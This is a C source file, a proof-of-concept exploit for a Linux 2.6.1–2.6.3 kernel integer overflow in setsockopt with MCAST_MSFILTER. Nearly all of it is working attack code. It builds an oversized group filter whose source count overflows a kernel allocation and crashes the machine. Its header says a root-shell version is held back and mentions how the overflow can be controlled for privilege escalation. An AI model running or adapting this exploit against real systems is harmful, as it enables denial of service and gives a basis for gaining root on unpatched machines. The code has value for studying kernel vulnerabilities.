/* setsockopt proof of concept code by Julien TINNES (julien a.t cr0.org)
   vulnerability found (as always ;) by Paul Starzetz

   This is only a lame POC which will crash the machine, no root shell here.
   Maybe later, when everybody will have an updated box.

   It should work on 2.6.1, 2.6.2 and 2.6.3 kernels.

   Greets to Christophe Devine, too bad you wasn't with me for this one.

*/


#include <errno.h>
void perror (const char *s);

#include <sys/types.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <linux/socket.h>

#define SOL_IP        0
#define MCAST_MSFILTER 48

/* mynumsrc and alloc_room control the overflow
 * what we write can be controlled too (not needed
 * here but needed for rootshell exploit
 */

#define mynumsrc 0x100		/* 0x100 should be enough, can be tweaked */
#define alloc_room 1		/* let it alocate only one u32 */

struct mygroup_filter
{
  __u32 gf_interface;		/* interface index */
  struct sockaddr_storage gf_group;	/* multicast address */
  __u32 gf_fmode;		/* filter mode */
  __u32 gf_numsrc;		/* number of sources */
  struct sockaddr_storage gf_slist[mynumsrc];	/* interface index */
};


void
main (void)
{

  int mysocket;
  int sockprot;
  struct mygroup_filter mygroup;
  int optlen;
  int i;
  struct sockaddr_in *psin;

  mygroup.gf_interface = 0;
  mygroup.gf_numsrc = (1 << 30) - 4 + alloc_room;

  mygroup.gf_group.ss_family = AF_INET;



  for (i = 0; i < mynumsrc; i++)
    {
      psin = (struct sockaddr_in *) &mygroup.gf_slist[i];
      psin->sin_family = AF_INET;
    }


  mysocket = socket (PF_INET, SOCK_STREAM, 0);

  if (mysocket == -1)
    {
      perror ("Socket creation error: ");
      exit (1);
    }

  optlen = sizeof (struct mygroup_filter);

  printf ("Calling setsockopt(), this should crash the box...\n");
  sockprot = setsockopt (mysocket, SOL_IP, MCAST_MSFILTER, &mygroup, optlen);

  if (sockprot == -1)
    {
      perror ("Invalid setsockopt: ");
      exit (1);
    }


}